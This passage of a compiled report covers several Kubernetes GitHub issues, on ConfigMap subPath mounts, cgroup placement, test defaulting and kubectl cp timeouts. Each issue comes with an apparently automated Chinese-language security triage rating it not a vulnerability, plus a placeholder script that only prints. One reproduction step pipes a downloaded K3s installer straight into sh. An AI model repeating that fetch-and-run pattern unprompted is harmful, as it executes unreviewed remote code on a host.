Error: failed to generate container "ddcc1d587faca0a37bc7ee0bf46abbf7ce009c31a838f00f7a2a640667b713da" spec: failed to generate spec: failed to mkdir "/var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0": mkdir /var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0: file exists
```

`journalctl -u k3s`:

```log
Mar 22 14:22:06 archlinux k3s[6466]: Unmounting arguments: /var/lib/kubelet/pods/bf088366-22fe-495e-a0f3-f78aeece8cbf/volume-subpaths/config/demo/0
Mar 22 14:22:06 archlinux k3s[6466]: Output: umount: can't unmount /var/lib/kubelet/pods/bf088366-22fe-495e-a0f3-f78aeece8cbf/volume-subpaths/config/demo/0: Permission denied
Mar 22 14:22:07 archlinux k3s[6466]: E0322 14:22:07.978619    6466 pod_workers.go:1301] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"demo\" with ImagePullBackOff: \"Back-off pulling image \\\"alpine\\\"\"" pod="default/test" pod>
Mar 22 14:22:32 archlinux k3s[6466]: E0322 14:22:32.833710    6466 mount_linux.go:282] Mount failed: exit status 32
Mar 22 14:22:32 archlinux k3s[6466]: Mounting command: mount
Mar 22 14:22:32 archlinux k3s[6466]: Mounting arguments: --no-canonicalize -o bind /proc/6466/fd/274 /var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0
Mar 22 14:22:32 archlinux k3s[6466]: Output: mount: /var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0: move_mount() failed: No such file or directory.
Mar 22 14:22:32 archlinux k3s[6466]:        dmesg(1) may have more information after failed mount system call.
Mar 22 14:22:32 archlinux k3s[6466]: E0322 14:22:32.834019    6466 subpath_linux.go:219] Failed to clean subpath "/var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0": error cleaning subpath mount /var/lib/kubelet/po>
Mar 22 14:22:32 archlinux k3s[6466]: E0322 14:22:32.834070    6466 kubelet_pods.go:349] "Failed to prepare subPath for volumeMount of the container" err=<
Mar 22 14:22:32 archlinux k3s[6466]:         error mounting /var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volumes/kubernetes.io~configmap/config/..2025_03_22_14_20_59.1325584633/test.conf: mount failed: exit status 32
Mar 22 14:22:32 archlinux k3s[6466]:         Mounting command: mount
Mar 22 14:22:32 archlinux k3s[6466]:         Mounting arguments: --no-canonicalize -o bind /proc/6466/fd/274 /var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0
Mar 22 14:22:32 archlinux k3s[6466]:         Output: mount: /var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0: move_mount() failed: No such file or directory.
Mar 22 14:22:32 archlinux k3s[6466]:                dmesg(1) may have more information after failed mount system call.
Mar 22 14:22:32 archlinux k3s[6466]:  > containerName="demo" volumeMountName="config"
```

> The `dmesg` does not show any error messages related to the `mount` command. 

https://github.com/user-attachments/assets/34ea22cb-484b-4a1d-b958-1358ff59dc25

#### What did you expect to happen?

Pod using ConfigMap SubPath volumes should be created successfully.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Bump `util-linux` version `2.41`.
    ````console
    # pacman -Si util-linux
    Repository      : core
    Name            : util-linux
    Version         : 2.41-2
    ....
    ````
2. Install K3s or RKE2.
    ```bash
    # export INSTALL_K3S_MIRROR=cn   # Uncomment if install K3s in China regions.
    curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | \
        INSTALL_K3S_VERSION=v1.31.6+k3s1 \
        sh -s - server \
        --cluster-init

    # After the K3s server ready
    mkdir -p ~/.kube/config
    cat /etc/rancher/k3s/k3s.yaml > ~/.kube/config
    ```
3. Apply the following example ConfigMap and Pod configuration.
```yaml
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: test
data:
  test.conf: |
    AAA=FOO
    BBB=BAR
---
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
    - name: demo
      image: alpine
      command: ["sleep", "3600"]
      volumeMounts:
      - name: config
        mountPath: "/config"
        subPath: "test.conf"
  volumes:
  # You set volumes at the Pod level, then mount them into containers inside that Pod
  - name: config
    configMap:
      # Provide the name of the ConfigMap you want to mount.
      name: test
      items:
        - key: test.conf
          path: test.conf

```
4. Pod failed to create with following error in events.

```log
# kubectl describe pod test
 Warning  Failed     49m                  kubelet            Error: failed to generate container "ddcc1d587faca0a37bc7ee0bf46abbf7ce009c31a838f00f7a2a640667b713da" spec: failed to generate spec: failed to mkdir "/var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0": mkdir /var/lib/kubelet/pods/ed5ba81a-2777-4ac9-a986-33238d803bdf/volume-subpaths/config/demo/0: file exists
```

#### Anything else we need to know?

```console
# kubectl get nodes
NAME        STATUS   ROLES                       AGE     VERSION
archlinux   Ready    control-plane,etcd,master   5h58m   v1.31.6+k3s1
```

#### Kubernetes version

<details>

```console
# kubectl version
Client Version: v1.32.3
Kustomize Version: v5.5.0
Server Version: v1.31.6+k3s1
```

</details>


#### Cloud provider

<details>
Not using a public cloud.

The RKE2 / K3s are installed on the KVM and bare metal machines.
</details>


#### OS version

<details>

```console
[root@archlinux ~]# cat /etc/os-release 
NAME="Arch Linux"
PRETTY_NAME="Arch Linux"
ID=arch
BUILD_ID=rolling
ANSI_COLOR="38;2;23;147;209"
HOME_URL="https://archlinux.org/"
DOCUMENTATION_URL="https://wiki.archlinux.org/"
SUPPORT_URL="https://bbs.archlinux.org/"
BUG_REPORT_URL="https://gitlab.archlinux.org/groups/archlinux/-/issues"
PRIVACY_POLICY_URL="https://terms.archlinux.org/docs/privacy-policy/"
LOGO=archlinux-logo

$ uname -a
Linux archlinux 6.13.7-arch1-1 #1 SMP PREEMPT_DYNAMIC Thu, 13 Mar 2025 18:12:00 +0000 x86_64 GNU/Linux

```

</details>


#### Install tools

<details>
K3s and RKE2
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了一个在将`util-linux`包升级到`2.41`版本后，使用ConfigMap SubPath方式挂载Volume的Pod无法成功创建的问题。错误日志显示`kubelet`在尝试为subPath创建挂载点时遇到了`mkdir ...: file exists`以及后续的`mount ... move_mount() failed: No such file or directory`和`umount: ... Permission denied`错误。

核心问题在于`kubelet`（在K3s/RKE2环境中）与新版本`util-linux`（特别是其`mount`命令的行为或依赖）之间存在兼容性问题，导致标准的subPath挂载流程失败。这本质上是一个功能性Bug，影响了依赖该特性的应用的部署和运行。

根据风险判断标准：
1.  **非安全问题**：该问题是由于底层依赖库版本变更导致的Kubernetes核心功能（subPath挂载）失效，属于功能性问题或兼容性问题，并未引入新的攻击向量或暴露敏感信息。它阻止了Pod的正常启动，影响了可用性，但不是一个安全漏洞。
2.  **影响**：主要影响是使用了ConfigMap SubPath挂载的Pod无法启动，导致依赖此配置的服务不可用。
3.  **DoS可能性**：虽然这会导致服务无法启动，可以看作一种拒绝服务（DoS），但触发条件是用户（或管理员）尝试部署一个使用特定功能的Pod。攻击者如果已经拥有创建Pod的权限，他们可以通过部署这种（当前版本下）无法运行的Pod来消耗资源或阻止服务启动，但这并未超出他们已有权限所能造成的影响范围。根据规则5，这种需要创建权限才能触发的DoS场景，不应判断为高风险。
4.  **其他风险**：日志中并未泄露凭据（规则6），问题描述也不涉及命令执行、容器逃逸、提权等高危风险（规则7），也非多用户场景下低权限影响高权限用户的问题（规则8）。

综上所述，该Issue描述的是一个功能性Bug，而非安全漏洞。

**复现过程：**

```python
# 该Issue被评定为"不涉及"安全风险，主要是一个功能性Bug。
# 根据要求，仅针对高风险问题提供复现POC。
# 因此，此处不提供复现脚本。

def main():
    print("该Issue被评定为'不涉及'安全风险，主要是一个功能性Bug。")
    print("根据要求，仅针对高风险问题提供复现POC。")
    print("因此，不提供复现脚本。")

# 直接调用 main 函数
main()
```


**解释说明：**

该Issue报告了一个在特定环境（`util-linux` >= 2.41）下，Kubernetes/K3s的ConfigMap SubPath Volume挂载功能失败的问题。这是一个由软件版本兼容性引起的**功能性Bug**，导致配置了特定Volume挂载方式的Pod无法启动，影响了服务的可用性。

由于该问题并未引入新的安全攻击面，例如远程代码执行、权限提升、信息泄露或越权访问等，它不被视为一个安全漏洞。尽管它会导致服务中断（一种形式的DoS），但触发该问题需要用户具有在集群中创建Pod的权限，并且影响的是用户自己尝试创建的Pod。根据提供的风险判断标准，特别是规则2和规则5，此类问题不归类为安全风险，尤其是高风险。

因此，风险评级为“不涉及”，并且按照要求，无需提供复现POC脚本。提供的Python代码仅包含注释和打印语句，说明不生成POC的原因。

---


## Issue #130982 Inconsistent cgroup placement and naming between containerd and CRI-O with user namespaces

- Issue 链接：[#130982](https://github.com/kubernetes/kubernetes/issues/130982)

### Issue 内容

#### What happened?

When running Kubernetes with user namespaces enabled, there is an inconsistency in cgroup hierarchy and naming convention between containerd and CRI-O.

## Containerd behavior (using user namespace)
 * **Sandbox cgroup** is created inside `kubepods.slice`
 * **Container cgroup** is placed under `system.slice` instead of `kubepods.slice`, using a non-standard format that includes `slice:cri-containerd:<container_id>`
```bash
/sys/fs/cgroup/
├── kubepods.slice
│   ├── kubepods-besteffort.slice
│   │   └── kubepods-besteffort-pod<pod_id>.slice 
│   │       └── cri-containerd-<sandbox_id>.scope
│   ...
├── system.slice
│   ├── kubepods-besteffort-pod<pod_id>.slice:cri-containerd:<continer_id>
```

## Containerd behavior (without user namespace)
```bash
/sys/fs/cgroup/
├── kubepods.slice
│   ├── kubepods-besteffort.slice
│   │   └── kubepods-besteffort-pod<pod_id>.slice 
│   │       ├── cri-containerd-<sandbox_id>.scope
│   │       └── cri-containerd-<continer_id>.scope
```

It looks inconsistent because:
 * Cgroup of container that use user namespaces should be inside `kubepods.slice` just like the sandbox.
 * Naming convention is different depending on the use of userns.

## CRI-O behavior (with and without user namespaces)
 * Container and sandbox cgroups are always placed in the same location and follow a consistent naming format, whether user namespaces are enabled or not.
```bash
/sys/fs/cgroup/
├── kubepods.slice
│   ├── kubepods-besteffort.slice
│   │   ├── kubepods-besteffort-pod<pod_id>.slice
│   │   │   ├── crio-<sandbox_id>
│   │   │   └── crio-<container_id>.scope
│   │   │       └── container
├── system.slice
│   ├── crio-conmon-<container_id>.scope
```









#### What did you expect to happen?

Both container runtimes should follow **consistent cgroup hierarchy and naming rules:**

 * Container cgroups should be placed inside `kubepods.slice`, not `system.slice` (as containerd currently does).

 * **Naming should follow a predictable format**, rather than using `slice:cri-containerd:<container_id>`.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Enable user namespaces [Use a User Namespace With a Pod](https://kubernetes.io/docs/tasks/configure-pod-container/user-namespaces/).
2. Deploy a pod on both container runtimes (containerd and CRI-O).
3. Compare the resulting cgroup hierarchy under: `/sys/fs/cgroup/`

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.2+k3s1
Kustomize Version: v5.5.0
Server Version: v1.32.2+k3s1
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.2 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.2 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo

$ uname -a
Linux 6.11.0-17-generic #17~24.04.2-Ubuntu SMP PREEMPT_DYNAMIC Mon Jan 20 22:48:29 UTC 2 x86_64 x86_64 x86_64 GNU/Linux


```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
Container runtime 1: containerd v2.0.2
Container runtime 2: CRI-O v1.32.2
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
此 Issue 描述了在使用用户命名空间 (user namespaces) 时，`containerd` 和 `CRI-O` 这两个容器运行时在 cgroup 层级结构和命名约定方面存在不一致性。

具体来说：
1.  `containerd` 在启用用户命名空间时，会将容器 (container) 的 cgroup 放置在 `/sys/fs/cgroup/system.slice` 下，而不是预期的 `/sys/fs/cgroup/kubepods.slice` 下（沙箱 cgroup 仍然在 `kubepods.slice` 下）。
2.  `containerd` 在这种情况下使用的 cgroup 命名 (`slice:cri-containerd:<container_id>`) 也与不使用用户命名空间时的命名 (`cri-containerd-<container_id>.scope`) 不同。
3.  `CRI-O` 则无论是否使用用户命名空间，都将容器和沙箱的 cgroup 放置在 `kubepods.slice` 下，并使用一致的命名格式。

这种不一致性主要是一个功能性问题或配置管理问题：
*   它可能导致依赖特定 cgroup 路径或命名约定的监控、资源管理或策略执行工具出现行为异常。
*   它破坏了不同容器运行时之间以及同一运行时不同配置下行为的一致性。

然而，根据 Issue 提供的信息，这种 cgroup 放置和命名的不一致性本身并未直接引入可利用的安全漏洞：
*   **没有信息泄露**：Issue 未描述敏感信息（如凭证）因此而被暴露。
*   **没有权限提升或逃逸**：Issue 未描述攻击者可以利用这种 cgroup 结构差异来提升权限、逃逸容器或访问未授权资源。cgroup 的主要作用是资源限制和隔离，虽然配置错误可能导致资源滥用（DoS），但仅仅是路径和命名的不一致，不直接等同于隔离被破坏或权限被提升。
*   **没有远程代码执行**：Issue 与代码执行无关。
*   **非 DoS 漏洞利用**：虽然 cgroup 与资源限制有关，但 Issue 描述的是 cgroup 的 *位置* 和 *名称* 不一致，而不是 cgroup 限制本身被绕过或可以被恶意修改。即使有潜在的 DoS 影响（例如，资源统计或限制工具失效），根据标准 5，如果需要权限（如创建 Pod 的权限）才能触发，通常不会评为高风险。此 Issue 甚至没有明确指出 DoS 的可能性。
*   **非多用户影响（安全层面）**：虽然发生在多用户环境（Kubernetes），但没有证据表明一个用户可以因为这个 cgroup 结构问题而影响到其他用户（在安全边界方面）。用户命名空间本身就是为了增强隔离。

因此，该 Issue 指出的问题是功能上的不一致性，而非可以直接利用的安全风险。它违反了“最小惊讶原则”，并可能给运维带来困扰，但根据提供的风险判断标准，它不构成一个安全漏洞。

**复现过程：**

```python
# 此 Issue 描述的是容器运行时在 cgroup 组织方式上的功能性不一致问题，
# 并非一个可利用的安全漏洞。因此，不提供用于安全风险复现的 POC 脚本。
#
# 要验证该 Issue 中描述的行为，需要按照 "How can we reproduce it" 部分的说明：
# 1. 配置 Kubernetes 集群节点以启用用户命名空间。
# 2. 分别在使用 containerd 和 CRI-O 作为运行时的节点上部署 Pod。
# 3. 在节点上检查 /sys/fs/cgroup/ 下的 cgroup 结构，对比 containerd 和 CRI-O 的差异。
#
# 以下伪代码演示了检查思路（非实际可运行脚本）：
#
# import os
# import re
#
# def check_cgroup_structure(runtime_type):
#     """
#     检查特定运行时下的 cgroup 结构 (伪代码)
#     """
#     cgroup_base = "/sys/fs/cgroup"
#     pod_cgroup_pattern = re.compile(r"kubepods-besteffort-pod[0-9a-f\-]+")
#     containerd_userns_pattern = re.compile(r"slice:cri-containerd:[0-9a-f]+")
#     containerd_nouserns_pattern = re.compile(r"cri-containerd-[0-9a-f]+\.scope")
#     crio_pattern = re.compile(r"crio-[0-9a-f]+\.scope")
#
#     print(f"Checking cgroup structure for {runtime_type}...")
#
#     kubepods_path = os.path.join(cgroup_base, "kubepods.slice", "kubepods-besteffort.slice")
#     system_slice_path = os.path.join(cgroup_base, "system.slice")
#
#     # 实际检查逻辑会更复杂，需要找到具体的 Pod 和 Container cgroup
#     # 这里仅示意性地列出路径
#
#     if runtime_type == "containerd_with_userns":
#         print(f"Expected Pod Sandbox Cgroup under: {kubepods_path}/<pod_slice>/cri-containerd-<sandbox_id>.scope")
#         print(f"Expected Container Cgroup under: {system_slice_path}/<pod_slice>:<container_id>") # <-- Inconsistent location
#         # 实际检查需要遍历 system.slice 查找匹配 containerd_userns_pattern 的项
#
#     elif runtime_type == "containerd_without_userns":
#         print(f"Expected Pod Sandbox Cgroup under: {kubepods_path}/<pod_slice>/cri-containerd-<sandbox_id>.scope")
#         print(f"Expected Container Cgroup under: {kubepods_path}/<pod_slice>/cri-containerd-<container_id>.scope") # <-- Consistent location
#
#     elif runtime_type == "crio":
#         print(f"Expected Pod Sandbox Cgroup under: {kubepods_path}/<pod_slice>/crio-<sandbox_id>")
#         print(f"Expected Container Cgroup under: {kubepods_path}/<pod_slice>/crio-<container_id>.scope") # <-- Consistent location
#
# # 运行检查 (需要根据实际环境调整)
# # check_cgroup_structure("containerd_with_userns")
# # check_cgroup_structure("containerd_without_userns")
# # check_cgroup_structure("crio")

print("该 Issue 描述了一个功能性不一致问题，而非安全漏洞，无需提供 POC 脚本。")
```


**解释说明：**

该 Issue 指出的核心问题是 `containerd` 在启用用户命名空间时，其创建的容器 cgroup 的存放位置和命名方式与不启用用户命名空间时、以及与 `CRI-O` 的行为不一致。这违反了一致性和可预测性原则，可能影响依赖 cgroup 路径的系统管理或监控工具。

然而，这种不一致性本身并不构成一个可以直接利用的安全漏洞。Issue 中没有提供证据或场景说明这种不一致性会导致权限提升、容器逃逸、信息泄露或可利用的拒绝服务。它是一个功能层面的 Bug 或设计不一致。

根据风险判断标准：
1.  该问题非安全问题，因此风险评级为“不涉及”。
2.  由于风险评级不是“高风险”，因此不需要提供用于复现安全风险的 Python POC 脚本。

提供的 Python 代码块中包含注释，解释了为何不提供 POC，并给出了验证 Issue 所述行为的思路（检查 `/sys/fs/cgroup` 目录结构），但并未实现一个可执行的 POC 脚本，因为不存在需要复现的安全风险。脚本最后打印一条信息说明情况。

---


## Issue #130975 k8s.io/apiserver/pkg/registry/generic/testing: store objects with defaults applied

- Issue 链接：[#130975](https://github.com/kubernetes/kubernetes/issues/130975)

### Issue 内容

#### What happened?

When adding DeviceTaintRule with defaulting that sets a "TimeAdded" to the current time, the pkg/registry/resource/devicetaintrule/storage using the helpers from k8s.io/apiserver/pkg/registry/generic/testing randomly failed.

Debugging showed that defaulting was called multiple times when reading an object while reading an object from storage without that default. Depending on *when* the read happened, the returned object was different when crossing from one second into the next.

https://github.com/kubernetes/kubernetes/pull/130970#discussion_r2007258939

#### What did you expect to happen?

Defaulting should be applied before storing an object, like it normally is.

/cc @wojtek-t 
/sig api-machinery


#### How can we reproduce it (as minimally and precisely as possible)?

* Revert https://github.com/kubernetes/kubernetes/pull/130970.
* `go test -c ./pkg/registry/resource/devicetaintrule/storage && stress ./storage.test`


#### Anything else we need to know?

_No response_

#### Kubernetes version

1.33

#### Cloud provider

n/a

#### OS version

_No response_

#### Install tools




#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述了一个在 Kubernetes API 服务器的通用注册表测试包 (`k8s.ioio/apiserver/pkg/registry/generic/testing`) 中发现的问题。具体来说，当使用带有默认值（例如将 `TimeAdded` 字段设置为当前时间）的 `DeviceTaintRule` 资源时，测试会随机失败。原因是默认值设置逻辑 (defaulting) 在从存储中读取一个*未*应用该默认值的对象时被多次调用。如果读取操作恰好发生在秒数跨越的时刻，由于 `TimeAdded` 默认值为当前时间，多次调用 defaulting 会导致返回的对象状态不一致，从而引发测试失败。

根据 Issue 内容分析：
1.  **问题领域**：该问题发生在 `generic/testing` 包中，这是用于**测试** API 资源存储逻辑的辅助工具，而不是生产环境 API 服务器的核心运行时逻辑本身。
2.  **问题性质**：这是一个**功能性缺陷或不一致性 (functional bug/inconsistency)**，导致测试结果不稳定 (flaky tests)。它影响的是使用这些测试辅助工具进行开发的开发者，而不是运行 Kubernetes 集群的用户或管理员。
3.  **影响范围**：影响主要局限于**测试环境**的可靠性。它不直接暴露生产环境中的安全漏洞，例如远程代码执行、权限提升、信息泄露或拒绝服务。虽然代码的正确性很重要，但此特定问题并未描述一个可被外部攻击者利用来危害集群安全的途径。
4.  **复现方式**：复现步骤涉及回滚一个 PR 并运行 Go 测试 (`go test ... && stress ...`)，这进一步证实了问题发生在开发和测试阶段。
5.  **与安全风险标准的比对**：
    *   标准 2：该问题是测试代码的正确性问题，而非安全问题。
    *   标准 4：非提交者问题。
    *   标准 5, 6, 7, 8：不涉及 DoS、凭证泄露、命令执行、提权、多用户影响等高风险场景。

结论：该 Issue 描述的是一个测试框架中的功能性缺陷，导致测试不稳定，不构成对 Kubernetes 运行环境的安全风险。

**复现过程：**

```python
# 该 Issue 描述的问题是 Kubernetes 内部测试框架 (k8s.io/apiserver/pkg/registry/generic/testing) 的一个功能性缺陷，
# 导致在使用特定资源和默认值时测试不稳定。
# 它并非一个可以在运行中的 Kubernetes 集群上被利用的安全漏洞。
# 复现该问题需要：
# 1. 获取 Kubernetes 源码。
# 2. 回滚指定的 Pull Request (https://github.com/kubernetes/kubernetes/pull/130970)。
# 3. 在源码环境中运行 Go 语言的测试命令 (`go test -c ./pkg/registry/resource/devicetaintrule/storage && stress ./storage.test`)。
#
# 这种类型的复现无法通过简单的 Python 脚本与 Kubernetes API 交互来模拟。
# 它需要在 Kubernetes 的开发环境中，针对特定的 Go 代码包运行单元测试或集成测试。
#
# 因此，无法提供一个有意义的、能在真实环境中复现此特定测试框架缺陷的 Python POC 脚本。
# 该问题不属于可以通过外部交互触发的安全风险。

print("该 Issue 指出的问题是一个影响 Kubernetes 内部测试稳定性的功能缺陷，")
print("并非一个可通过 Python 脚本与运行中集群交互来复现的安全漏洞。")
print("复现需要在 Kubernetes 开发环境中执行特定的 Go 测试。")
print("因此，不提供复现脚本。")
```


**解释说明：**

上述 Python 脚本并未实际执行复现操作。原因如下：

1.  **问题性质限制**：该 Issue 描述的是 Kubernetes 内部 Go 语言测试代码 (`pkg/registry/generic/testing`) 的一个缺陷，它导致了 Go 单元/集成测试的不稳定。这不是一个可以通过与 Kubernetes API 交互（例如使用 `kubernetes` Python 库）来触发或利用的运行时漏洞。
2.  **复现环境要求**：根据 Issue 中提供的复现步骤，需要访问 Kubernetes 的源代码，回滚特定的代码更改，并使用 Go 工具链来编译和执行特定的测试。这超出了 Python 脚本与运行中集群交互的范畴。
3.  **安全风险评估**：如分析所述，该问题被评级为“不涉及”安全风险，因为它影响的是开发测试流程的可靠性，而非集群的安全性。根据要求，仅针对高风险问题提供复现脚本。

因此，脚本仅打印说明信息，解释了为什么无法为此 Issue 提供一个有实际意义的 Python 复现 POC。

---


## Issue #130972 Issue with kubectl on v1.32 when trying to copy files to pod

- Issue 链接：[#130972](https://github.com/kubernetes/kubernetes/issues/130972)

### Issue 内容

#### What happened?

To be honest, this one is a little difficult to recreate, but we are running a gitlab runner on eks in one cluster and attempting to copy files to a pod in another cluster. With the v1.28 kubectl client, we have had no issue, but every now and again with the 1.32.2 (and after reading about this issue https://github.com/kubernetes/kubernetes/pull/130253 we also tried 1.32.3) the connection will randomly drop.

Turning on verbosity up to 9

```
I0321 08:36:56.416328    2298 round_trippers.go:577] HTTP Statistics: DNSLookup 0 ms Dial 1 ms TLSHandshake 4 ms ServerProcessing 22 ms Duration 29 ms
I0321 08:36:56.416341    2298 round_trippers.go:584] Response Headers:
I0321 08:36:56.416352    2298 round_trippers.go:587]     Upgrade: websocket
I0321 08:36:56.416360    2298 round_trippers.go:587]     Connection: Upgrade
I0321 08:36:56.416366    2298 round_trippers.go:587]     Sec-Websocket-Accept: d3elUzkdg3chrxOaBB2wRlGoYJ4=
I0321 08:36:56.416370    2298 round_trippers.go:587]     Sec-Websocket-Protocol: v5.channel.k8s.io
I0321 08:36:56.416381    2298 websocket.go:133] The subprotocol is v5.channel.k8s.io
I0321 08:37:01.416862    2298 websocket.go:497] Websocket Ping succeeeded
I0321 08:37:01.417365    2298 websocket.go:455] Pong message received ()--resetting read deadline
error: context deadline exceeded
```

but a working version 

```

I0321 08:36:54.696359    4031 round_trippers.go:584] Response Headers:
I0321 08:36:54.696365    4031 round_trippers.go:587]     Upgrade: websocket
I0321 08:36:54.696368    4031 round_trippers.go:587]     Connection: Upgrade
I0321 08:36:54.696371    4031 round_trippers.go:587]     Sec-Websocket-Accept: qrNgxMvN9dCz3AeqMEMz+OjDm3E=
I0321 08:36:54.696374    4031 round_trippers.go:587]     Sec-Websocket-Protocol: v5.channel.k8s.io
I0321 08:36:54.696378    4031 websocket.go:133] The subprotocol is v5.channel.k8s.io
I0321 08:36:54.696489    4031 websocket.go:357] Write() on stream 0
I0321 08:36:54.696536    4031 websocket.go:390] Write() done on stream 0
I0321 08:36:54.696568    4031 websocket.go:357] Write() on stream 0
I0321 08:36:54.696602    4031 websocket.go:390] Write() done on stream 0
I0321 08:36:54.696624    4031 websocket.go:357] Write() on stream 0
I0321 08:36:54.696651    4031 websocket.go:390] Write() done on stream 0
I0321 08:36:54.696669    4031 websocket.go:357] Write() on stream 0
I0321 08:36:54.696701    4031 websocket.go:390] Write() done on stream 0
I0321 08:36:54.696717    4031 websocket.go:357] Write() on stream 0
I0321 08:36:54.696739    4031 websocket.go:390] Write() done on stream 0
I0321 08:36:54.696747    4031 websocket.go:395] Close() on stream 0
I0321 08:36:54.696762    4031 websocket.go:405] Close() done on stream 0
I0321 08:36:54.776199    4031 websocket.go:490] closed channel--returning
```
The apiserver is on v1.32.2

No issues using v1.28 client, i suspect it has something to do with the new exec protocol? What's strange is we don't see that Ping message on a working version


#### What did you expect to happen?

I expect the cp command to copy without issue

#### How can we reproduce it (as minimally and precisely as possible)?

The files we're copying aren't large- small text files, and i haven't been able to reproduce it locally. The best i can do is to try and be in a pod in one eks cluster, talking to another eks cluster and kubectl cp to that cluster

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.32.3
Server Version: v1.32.2-eks-bc803b4
```

</details>


#### Cloud provider

<details>
AWS EKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
Containerd
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
vpc-cni
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
1.  **Issue核心问题**：用户在使用 `kubectl` v1.32.x 版本（具体提到 1.32.2 和 1.32.3）从一个 EKS 集群中的 Gitlab Runner Pod 向另一个 EKS 集群中的 Pod 复制文件时，`kubectl cp` 命令会随机失败，并报 "context deadline exceeded" 错误。而使用 `kubectl` v1.28 版本则没有此问题。
2.  **日志分析**：
    *   失败的日志（v1.32）显示了 Websocket 连接建立成功 (`Sec-Websocket-Protocol: v5.channel.k8s.io`)，之后有 `Websocket Ping succeeeded` 和 `Pong message received`，然后才超时。
    *   成功的日志（v1.28，但日志片段可能不完整）显示了 Websocket 连接建立，然后是多次 `Write()` 和 `Close()` 操作，没有显示 Ping/Pong 消息（可能未发生或未截取到）。
    *   用户怀疑与 v1.32 引入的新 exec 协议（或其实现）有关。
3.  **问题性质**：该问题表现为 `kubectl cp` 功能在特定版本和特定（跨集群）场景下的不稳定性，导致命令执行超时失败。这看起来是一个功能性 Bug 或兼容性问题，而不是典型的安全漏洞。命令执行的前提是用户拥有合法的 `kubectl cp` 权限（通常需要 Pod 的 exec 权限）。
4.  **安全风险评估**：
    *   **保密性 (Confidentiality)**：Issue 中没有描述数据泄露。用户提供的日志中也没有显示敏感信息（如凭证、私密数据等），只有标准的 Websocket 协议交互信息。
    *   **完整性 (Integrity)**：命令失败意味着无法完成文件复制，影响了操作的完整性，但这属于功能性问题，而非数据被篡改。
    *   **可用性 (Availability)**：对于需要执行 `kubectl cp` 的用户来说，此 Bug 导致该功能间歇性不可用。这可以被视为一种特定功能的拒绝服务 (DoS)。但是，根据风险判断标准第 5 条，这种 DoS 是针对执行操作的用户自身的，且需要用户具备执行 `kubectl cp` 的权限（非只读权限）。它不是一个攻击者可以利用来影响其他用户或整个服务的漏洞。攻击者无法通过触发这个 Bug 来阻止 *其他* 合法用户使用 `kubectl cp` 或其他服务。
    *   **权限提升/命令执行/容器逃逸**：Issue 完全没有涉及这些高风险场景。`kubectl cp` 本身就是在授权范围内执行的操作，其失败并未导致权限提升或非预期的代码执行。
    *   **多用户影响**：如上所述，此问题影响的是执行命令的用户本身，不会因为一个用户触发此 Bug 而影响到其他用户（除非底层 API Server 资源被异常消耗，但 Issue 并未提供这方面证据，且错误发生在客户端超时）。
    *   **敏感信息暴露**：Issue 提交者提供的日志不包含敏感信息。符合风险判断标准第 4 条，即使包含，也应视为提交者的问题。

5.  **结论**：该 Issue 描述的是一个功能性 Bug，导致 `kubectl cp` 在特定条件下失败。虽然影响了可用性，但它需要执行者拥有相应权限，并且影响范围限于执行者自身的操作，不符合高风险或低风险安全漏洞的定义。

**复现过程：**

```python
# Not applicable, as the issue is rated "不涉及" (Not Involved) security risk.
# 该问题被评级为“不涉及”安全风险，因此不需要提供复现脚本。
# 问题本质上是一个功能性 Bug 或兼容性问题，其复现依赖于特定的环境（跨 EKS 集群网络、特定版本的 kubectl 和 K8s API Server），
# 并且表现为间歇性超时，难以通过简单的脚本稳定复现。
# 如果需要调试该功能问题，应遵循 Issue 中提到的环境设置尝试复现。

